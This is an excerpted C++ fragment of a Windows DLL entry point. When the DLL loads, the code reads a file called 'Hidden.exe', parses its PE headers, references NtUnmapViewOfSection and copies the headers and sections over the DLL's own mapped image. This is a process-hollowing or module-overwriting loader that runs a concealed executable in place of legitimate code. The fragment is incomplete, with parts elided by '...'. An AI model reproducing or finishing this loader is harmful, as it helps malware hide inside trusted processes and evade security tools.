                     ...
                     )
{
    if (ul_reason_for_call == DLL_PROCESS_ATTACH)
    {
		...
		GetFullPathNameA("Hidden.exe", MAX_PATH, DLLPath, nullptr);

		std::string Path = DLLPath;

		std::basic_ifstream<BYTE> file(Path.c_str(), std::ios::binary);

		std::vector<BYTE> Contents = { std::istreambuf_iterator<BYTE>(file), std::istreambuf_iterator<BYTE>() };
		BYTE* Data = Contents.data();


		NtUnmapViewOfSection_t NtUnmapViewOfSection;

		IMAGE_NT_HEADERS* NTHeaders = GetNTHeaders(Data);
		if (NTHeaders == NULL) {
			return 0;
		}
		...
		memcpy(DLLBaseAddress, Data, NTHeaders->OptionalHeader.SizeOfHeaders);

		IMAGE_SECTION_HEADER* SecHeaderAddr = (IMAGE_SECTION_HEADER*)((unsigned int)(NTHeaders)+sizeof(IMAGE_NT_HEADERS));
		for (int i = 0; i < NTHeaders->FileHeader.NumberOfSections; i++)
			memcpy(LPVOID((unsigned int)(DLLBaseAddress)+SecHeaderAddr[i].VirtualAddress), LPVOID((unsigned int)(Data)+SecHeaderAddr[i].PointerToRawData), SecHeaderAddr[i].SizeOfRawData);
